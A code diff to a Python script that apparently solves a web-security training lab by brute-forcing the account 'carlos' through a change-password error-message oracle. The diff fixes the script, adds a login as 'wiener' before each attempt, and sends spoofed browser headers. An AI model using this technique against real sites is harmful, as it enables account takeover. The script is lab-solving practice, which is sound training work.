@@ -36,6 +36,7 @@ def main():
     session.proxies = proxies
   session.verify = False
   url = args.url.strip('/')
+  session.get(url)
 
   print(f"{Fore.YELLOW}Step 1.{Fore.RESET} Reading password list...")
   passwords = read_passwords()
@@ -49,7 +50,7 @@ def main():
     print(f"{Fore.RED}[-] Could not found the valid password to 'carlos' account!{Fore.RESET}")
 
   print(f"{Fore.YELLOW}Step 3.{Fore.RESET} Login as 'carlos'...")
-  if login(session, url, password):
+  if login(session, url, {"username":"carlos", "password": password}):
     print(f"{Fore.GREEN}[+] Lab Solved!{Fore.RESET}")
 
 def read_passwords():
@@ -63,13 +64,21 @@ def read_passwords():
 def brute_force_password(session, url, passwords):
   for password in passwords:
     try:
+      login(session, url, {"username": "wiener", "password": "peter"})
       data = {
         "username": "carlos",
-        "current-password": {password},
+        "current-password": password,
         "new-password-1": "password1",
         "new-password-2": "password2"
       }
-      response = session.post(f"{url}/my-account/change-password", data=data, allow_redirects=False)
+      headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Referer": f"{url}/my-account",
+        "Origin": url
+      }
+      print(f"Trying {Fore.YELLOW}{password:20}{Fore.RESET}", end="\r", flush=True)
+      response = session.post(f"{url}/my-account/change-password", data=data, headers=headers, allow_redirects=False)
 
       if response.status_code == 200 and "New passwords do not match" in response.text:
         return password
@@ -79,9 +88,9 @@ def brute_force_password(session, url, passwords):
       exit(1)
   return None
 
-def login(session, url, password):
+def login(session, url, data):
   try:
-    response = session.post(f"{url}/login", data={"username": "carlos", "password": password})
+    response = session.post(f"{url}/login", data=data)
     
     if response.status_code != 200:
       print(f"{Fore.RED}[-] Status code other than 200, see Burp Proxy history for better information{Fore.RESET}")
@@ -95,4 +104,3 @@ def login(session, url, password):
   
 if __name__ == "__main__":
   main()
-
